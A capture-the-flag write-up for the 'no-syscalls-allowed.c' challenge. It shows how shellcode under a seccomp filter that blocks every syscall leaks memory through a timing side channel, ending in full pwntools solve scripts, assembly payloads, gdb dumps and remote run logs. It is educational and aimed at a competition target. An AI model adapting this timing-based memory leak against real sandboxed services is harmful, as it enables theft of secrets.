# no-s-syscalls-allowed.c

### Beating an Over-Enthusiastic Seccomp Jail

The description for this challenge is as follows:

![image](https://user-images.githubusercontent.com/10614967/182054896-247b74a2-c2bd-4852-9343-6f01d086e733.png)

*"no cell phones sign on a wall"*

*No syscalls, no problem*

*author: kuilin*

This was a reasonably challenging shellcoding exercise; at the end of the competition, it was worth 205 points and had 35 solves. This was also a semi-block box challenge, in that we were given the source code of the binary without the compiled binary itself.

**TL;DR Solution:** Determine that the seccomp rules have disallowed all syscalls, but fortunately, the flag has been read into a global variable. Devise a timing attack to read out arbitrary bytes from the binary, use this technique to get a PIE leak from the stack, find the location of the flag global variable, and leak it out.

## Gathering Information:

Since only the source code is provided, we can start with a static analysis of that code. The source code shows a global variable called flag being initialized, into which the flag file is opened and read in the main function. Then, an rwx segment is mmapped, and 0x1000 bytes are read into that segment. Finally, a seccomp rule is called just before the newly mmapped code section is called as shellcode. This seccomp rule looks like it isn't providing any exceptions, which would make sense in light of the challenge's name and description. 
```
char flag[100];

void main(int argc, char *argv[]) {
  int fd = open("/flag.txt", O_RDONLY);
  read(fd, flag, sizeof flag);

  void *code = mmap(NULL, 0x1000, PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
  read(STDIN_FILENO, code, 0x1000);

  if (seccomp_load(seccomp_init(SCMP_ACT_KILL)) < 0) return;

  ((void (*)())code)();
}
```
In order to further confirm how the seccomp works, as well as provide a way to debug our shellcode locally, we can compile the sourcecode into a local binary. The sourcecode helpfully includes a comment indicating that the appropriate flags to do this are: "gcc no_syscalls_allowed.c -lseccomp -o no_syscalls_allowed". If we run seccomp-tools on the binary that this produces, we can see that there really does not appear to be any way around the lack of syscalls.
```
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/UIUCTF22$ seccomp-tools dump ./no_syscalls_allowed
aaaaaaaaaaaaaaaaaaaaaaaaaa
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x03 0xc000003e  if (A != ARCH_X86_64) goto 0005
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x00 0xffffffff  /* no-op */
 0005: 0x06 0x00 0x00 0x00000000  return KILL
```

## Leaking Bytes

Based on the lack of any available syscalls, the flag cannot be read out directly. As a result, I opted instead to come up with a non-syscall-based shellcode timing attack. The general idea is to leak out bytes a single bit at a time. If the bit is zero, the shellcode should exit out almost immediately. If the bit is one, the shellcode should hang for long enough to be clearly differentiated from the bit = zero state. Once all 8 bits are leaked out, an entire byte will have been revealed, assuming that the byte in the selected location stays the same between runs.

In practice, my bit-leaking shellcode has a few steps:

1: Load the byte we want to start leaking into the al (low byte of rax, randomly chosen) register. This byte could be one pointed to by a certain register address, or the value of the register itself; since the compilation instructions don't include a -no-pie flag, we can assume that PIE is on on the remote server, ASLR affects every memory region, and we have no alternatives for finding valid addresses. In initial testing, I used the contents of the rip register, since that is guaranteed to be bytes of my shellcode regardless of compilation or library differences and thus will provide me with a good idea of my technique's accuracy.

2: Isolate the desired bit in the byte by shifting al right by the index of the bit (right to left, zero indexed), shifting the register left by seven, then right again by seven to get rid of additional bits. There are likely other operations that could derive similar results.

3: Create a massively increased lag in exiting out if the bit is 1. I accomplished this by multiplying the bit value in rax by a large number, specifically 0x20000000 but anything large would work, and setting up a loop with r11 as a counter that ensure a loop would continue with an inc on each iteration until the r11 register reaches the now-large value in rax. In order to ensure that each iteration of the loop takes a noticeable amount of time, a random imul is executed at each iteration of the loop.

4: Measure how long it takes the program to stop after the payload is sent. If it is short, the bit is zero, if long, the bit is one. I used a recvall() for this since it seemed like the easiest way to force a stop in the connection when the EOF is hit.

5. Do this for every bit in a chosen byte and return the full byte.

Here is the function I used to get single bits, with options available for register to start with, how far from the register to look, which bit of the byte to leak, and whether to run the program on local or remote:
```
def get_a_bit(register, reg_offset, bit, local):
    if local == 1:
        target = process('./no_syscalls_allowed')
        pid = gdb.attach(target, "\nb *main+160\n set disassembly-flavor intel\ncontinue")
    else:
        target = remote('no-syscalls-allowed.chal.uiuc.tf', 1337)
    payload = asm('mov al, BYTE PTR ds:[' + register + '+' + str(reg_offset) + '''];
    xor r11, r11;
    shr al, ''' + str(bit) +''';
    shl al, 7;
    shr al, 7;
    imul rax, 0x20000000
    loop_start:
    cmp rax, r11;
    je loop_finished;
    inc r11;
    imul ebx, 0x13;
    jmp loop_start;
    loop_finished:
    ''')
    target.sendline(payload)
    current = time.time()
    print(target.recvall())
    now = time.time()
    diff = now - current
    print(diff)
    if diff > 0.2:
        print('the bit is 1')
        return 1
    else:
        print('the bit is 0')
        return 0
    target.close()
```
And here, I add a function to leak out full bytes bit-by-bit, and call it on the byte contents of the rip register.
```
def get_a_byte(register, reg_offset, local):
    bit_string = ''
    for i in range(8):
        bit_string = str(get_a_bit(register, reg_offset, i, local)) + bit_string
    print(bit_string)
    return int(bit_string, 2)

local = 1

byte = hex(get_a_byte('rip', 0x0, 1))

print('current byte is', byte)
```
If I quickly run the program locally with a debugger on, I can confirm exactly which byte I should be getting on this and similar rip tests (i.e. BYTE PTR [rip] should reliably be 0x4d)
```
   0x7ff954d9fffc                  add    BYTE PTR [rax], al
   0x7ff954d9fffe                  add    BYTE PTR [rax], al
   0x7ff954da0000                  mov    al, BYTE PTR [rip+0x0]        # 0x7ff954da0006
 → 0x7ff954da0006                  xor    r11, r11
   0x7ff954da0009                  shr    al, 0x0
   0x7ff954da000c                  shl    al, 0x7
   0x7ff954da000f                  shr    al, 0x7
   0x7ff954da0012                  imul   rax, rax, 0x20000000
   0x7ff954da0019                  cmp    rax, r11
─────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "no_syscalls_all", stopped 0x7ff954da0006 in ?? (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ff954da0006 → xor r11, r11
[#1] 0x55ef9491626b → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/bx $al
0x4d:   Cannot access memory at address 0x4d
gef➤  x/8bx $rip
0x7ff954da0006: 0x4d    0x31    0xdb    0xc0    0xe8    0x00    0xc0    0xe0
gef➤
```
And here is how the program looks when run against the remote host:
```
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/UIUCTF22$ python3 no-syscalls-allowed_writeup.py
[+] Opening connection to no-syscalls-allowed.chal.uiuc.tf on port 1337: Done
[+] Receiving all data: Done (30B)
[*] Closed connection to no-syscalls-allowed.chal.uiuc.tf port 1337
b'== proof-of-work: disabled ==\n'
0.5909402370452881
the bit is 1
[+] Opening connection to no-syscalls-allowed.chal.uiuc.tf on port 1337: Done
[+] Receiving all data: Done (30B)
[*] Closed connection to no-syscalls-allowed.chal.uiuc.tf port 1337
b'== proof-of-work: disabled ==\n'
0.08855581283569336
the bit is 0
[+] Opening connection to no-syscalls-allowed.chal.uiuc.tf on port 1337: Done
[+] Receiving all data: Done (30B)
[*] Closed connection to no-syscalls-allowed.chal.uiuc.tf port 1337
b'== proof-of-work: disabled ==\n'
0.5963900089263916
the bit is 1
[+] Opening connection to no-syscalls-allowed.chal.uiuc.tf on port 1337: Done
[+] Receiving all data: Done (30B)
[*] Closed connection to no-syscalls-allowed.chal.uiuc.tf port 1337
b'== proof-of-work: disabled ==\n'
0.5734691619873047
the bit is 1
[+] Opening connection to no-syscalls-allowed.chal.uiuc.tf on port 1337: Done
[+] Receiving all data: Done (30B)
[*] Closed connection to no-syscalls-allowed.chal.uiuc.tf port 1337
b'== proof-of-work: disabled ==\n'
0.10383796691894531
the bit is 0
[+] Opening connection to no-syscalls-allowed.chal.uiuc.tf on port 1337: Done
[+] Receiving all data: Done (30B)
[*] Closed connection to no-syscalls-allowed.chal.uiuc.tf port 1337
b'== proof-of-work: disabled ==\n'
0.08850741386413574
the bit is 0
[+] Opening connection to no-syscalls-allowed.chal.uiuc.tf on port 1337: Done
[+] Receiving all data: Done (30B)
[*] Closed connection to no-syscalls-allowed.chal.uiuc.tf port 1337
b'== proof-of-work: disabled ==\n'
0.5867149829864502
the bit is 1
[+] Opening connection to no-syscalls-allowed.chal.uiuc.tf on port 1337: Done
[+] Receiving all data: Done (30B)
[*] Closed connection to no-syscalls-allowed.chal.uiuc.tf port 1337
b'== proof-of-work: disabled ==\n'
0.09191155433654785
the bit is 0
01001101
current byte is 0x4d
```
Bytes are leaked out correctly, and the difference between 1 bits and 0 bits is large enough to be easily differentiated without resulting in an excessive pause between runs. 

### Finding the Flag

This step required some creativity since I did not have access to the compiled binary that is running on the server. So, step one was to look at some of the interesting offsets on the locally-compiled binary as an approximation of what the remote might look like. The flag variable itself is a little over 0x4000 bytes from the start of the code section; based on my knowledge of how binaries are typically structured, it should remain in that general area between the remote and local binaries, just with some potential variance in exactly how far it is from the start of that memory section. I also noted that, as expected, there should be some PIE leaks in the stack, which rbp should be pointing to (there were also some registers with PIE addresses locally, but I decided this would be more reliable). From most of these PIE leaks, you could derive the start of the code section by nulling out the final three nibbles and subtracting 0x1000, and confirm whether or not this is correct by checking the contents for the ELF binary header.
```
gef➤  x/s 0x56023f749000
0x56023f749000: "\177ELF\002\001\001"
gef➤  x/8bx 0x56023f749000
0x56023f749000: 0x7f    0x45    0x4c    0x46    0x02    0x01    0x01    0x00
gef➤  x/s 0x56023f74d040
0x56023f74d040 <flag>:  "flag{I_pwn3d_It}\n"
gef➤  x/20gx $rbp
0x7fff06c41950: 0x0000000000000000      0x00007f4dbd78c0b3
0x7fff06c41960: 0x00007f4dbd9bc620      0x00007fff06c41a48
0x7fff06c41970: 0x0000000100000000      0x000056023f74a1c9
0x7fff06c41980: 0x000056023f74a270      0x9f4b0cefc30c6dde
0x7fff06c41990: 0x000056023f74a0e0      0x00007fff06c41a40
0x7fff06c419a0: 0x0000000000000000      0x0000000000000000
0x7fff06c419b0: 0x60b50167f1cc6dde      0x61d0761e43c26dde
0x7fff06c419c0: 0x0000000000000000      0x0000000000000000
0x7fff06c419d0: 0x0000000000000000      0x0000000000000001
0x7fff06c419e0: 0x00007fff06c41a48      0x00007fff06c41a58
```
So, I started leaking addresses from rbp, with a focus on the sixth byte of each 8-byte address area in order to determine which memory region the address is for. For the second address, that byte was 0x7f, indicating a libc or stack address. Then, for the third address, it was 0x55, indicating a PIE address.
```
byte = hex(get_a_byte('rbp', 0x10+5, 0))
...
[+] Opening connection to no-syscalls-allowed.chal.uiuc.tf on port 1337: Done
[+] Receiving all data: Done (30B)
[*] Closed connection to no-syscalls-allowed.chal.uiuc.tf port 1337
b'== proof-of-work: disabled ==\n'
0.08438754081726074
the bit is 0
01010101
current byte is 0x55
```
I then got the low three nibbles of that PIE address as 098. 
```
byte = hex(get_a_byte('rbp', 0x10, 0))

print('current byte is', byte)

byte = hex(get_a_byte('rbp', 0x10 + 1, 0))

print('current byte is', byte)
```
I then used my PIE leak to get a leak for the beginning of the code section. To do this, I had to make new, slightly edited helper functions, the most notable of which appears at the start of the get_a_bit function to transfer the leak to an intermediary register and perform mathematical operations on it to make it the likely start of code area.:
```
def start_of_code_bit(reg_offset, bit, local):
    if local == 1:
        target = process('./no_syscalls_allowed')
        pid = gdb.attach(target, "\nb *main+160\n set disassembly-flavor intel\ncontinue")
    else:
        target = remote('no-syscalls-allowed.chal.uiuc.tf', 1337)
    payload = asm('''
    mov rbx, QWORD PTR ds:[rbp+0x10];
    sub rbx, 0x98;
    sub rbx, 0x1000;
    mov al, BYTE PTR ds:[rbx+''' + str(reg_offset) + '''];
    xor r11, r11;
    ...
```
I then added some code to leak the first four bytes from this area:
```
header = ''
for i in range(4):
    byte = (start_of_code_byte(i, 0))
    header += chr(byte)
print(header)
```
And it worked! The "\x7fELF" means that this is the very start of the code section.
```
...
the bit is 1
[+] Opening connection to no-syscalls-allowed.chal.uiuc.tf on port 1337: Done
[+] Receiving all data: Done (30B)
[*] Closed connection to no-syscalls-allowed.chal.uiuc.tf port 1337
b'== proof-of-work: disabled ==\n'
0.10019659996032715
the bit is 0
01000110
\x7fELF
```
Finally, I can start trying to find the flag! I set up a script to leak a few characters in 0x10 byte increments, beginning from the start of my probably global variable area. If this wasn't working, I would have tried searching smaller increments, but I was hopeful that I would be able to find the flag more efficiently this way and it worked out well. Here is the code:
```
for i in range(0x0, 0x100, 0x10):
    test = ''
    for j in range(4):
        byte = (start_of_code_byte(i+j+0x4000, 0))
        test += chr(byte)
    print(test)
    if 'uiu' in test:
        print('SUCCESS!!!')
        print('offset at', hex(i))
        break
```
And I get a hit 0x80 bytes from the start of the section!
```
[+] Opening connection to no-syscalls-allowed.chal.uiuc.tf on port 1337: Done
[+] Receiving all data: Done (30B)
[*] Closed connection to no-syscalls-allowed.chal.uiuc.tf port 1337
b'== proof-of-work: disabled ==\n'
0.09762144088745117
the bit is 0
01100011
uiuc
SUCCESS!!!
offset at 0x80
```
Now I can get the full flag and win the challenge! Here is my final solve script, with prior steps commented out:
```
from pwn import *

context.clear(arch='amd64')
def get_a_bit(register, reg_offset, bit, local):
    if local == 1:
        target = process('./no_syscalls_allowed')
        pid = gdb.attach(target, "\nb *main+160\n set disassembly-flavor intel\ncontinue")
    else:
        target = remote('no-syscalls-allowed.chal.uiuc.tf', 1337)
    payload = asm('mov al, BYTE PTR ds:[' + register + '+' + str(reg_offset) + '''];
    xor r11, r11;
    shr al, ''' + str(bit) +''';
    shl al, 7;
    shr al, 7;
    imul rax, 0x20000000
    loop_start:
    cmp rax, r11;
    je loop_finished;
    inc r11;
    imul ebx, 0x13;
    jmp loop_start;
    loop_finished:
    ''')
    target.sendline(payload)
    current = time.time()
    print(target.recvall())
    now = time.time()
    diff = now - current
    print(diff)
    if diff > 0.2:
        print('the bit is 1')
        return 1
    else:
        print('the bit is 0')
        return 0
    target.close()

def get_a_byte(register, reg_offset, local):
    bit_string = ''
    for i in range(8):
        bit_string = str(get_a_bit(register, reg_offset, i, local)) + bit_string
    print(bit_string)
    return int(bit_string, 2)

def start_of_code_bit(reg_offset, bit, local):
    if local == 1:
        target = process('./no_syscalls_allowed')
        pid = gdb.attach(target, "\nb *main+160\n set disassembly-flavor intel\ncontinue")
    else:
        target = remote('no-syscalls-allowed.chal.uiuc.tf', 1337)
    payload = asm('''
    mov rbx, QWORD PTR ds:[rbp+0x10];
    sub rbx, 0x98;
    sub rbx, 0x1000;
    mov al, BYTE PTR ds:[rbx+''' + str(reg_offset) + '''];
    xor r11, r11;
    shr al, ''' + str(bit) +''';
    shl al, 7;
    shr al, 7;
    imul rax, 0x20000000
    loop_start:
    cmp rax, r11;
    je loop_finished;
    inc r11;
    imul ebx, 0x13;
    jmp loop_start;
    loop_finished:
    ''')
    target.sendline(payload)
    current = time.time()
    print(target.recvall())
    now = time.time()
    diff = now - current
    print(diff)
    if diff > 0.2:
        print('the bit is 1')
        return 1
    else:
        print('the bit is 0')
        return 0
    target.close()

def start_of_code_byte(reg_offset, local):
    bit_string = ''
    for i in range(8):
        bit_string = str(start_of_code_bit(reg_offset, i, local)) + bit_string
    print(bit_string)
    return int(bit_string, 2)


#Verify leak methodology:
'''
byte = hex(get_a_byte('rip', 0, 0))
print(byte)
'''

#Search stack, manually incremented:
'''
byte = hex(get_a_byte('rbp', 0x10+5, 0))
print(byte)
'''

#Get final nibbles of PIE leak
'''
byte = hex(get_a_byte('rbp', 0x10, 0))
print('current byte is', byte)
byte = hex(get_a_byte('rbp', 0x10 + 1, 0))
print('current byte is', byte)
'''
#Verify start of code section
'''
header = ''
for i in range(4):
    byte = (start_of_code_byte(i, 0))
    header += chr(byte)
print(header)
'''
#Search for flag
'''
for i in range(0x80, 0x100, 0x10):
    test = ''
    for j in range(4):
        byte = (start_of_code_byte(i+j+0x4000, 0))
        test += chr(byte)
    print(test)
    if 'uiu' in test:
        print('SUCCESS!!!')
        print('offset at', hex(i))
        break
'''

flag = ''
for i in range(0x80, 0xb0):
    byte = (start_of_code_byte(0x4000+i, 0))
    print('current byte is', hex(byte))
    flag += chr(byte)
    print(flag)
    if byte == 0:
        print(i)
        break
print(flag)
```
And here is how it looks when run:
```
...
[+] Opening connection to no-syscalls-allowed.chal.uiuc.tf on port 1337: Done
[+] Receiving all data: Done (30B)
[*] Closed connection to no-syscalls-allowed.chal.uiuc.tf port 1337
b'== proof-of-work: disabled ==\n'
0.09932446479797363
the bit is 0
00000000
current byte is 0x0
uiuctf{timing-is-everything}\x00
156
uiuctf{timing-is-everything}\x00
```
Thanks for reading!
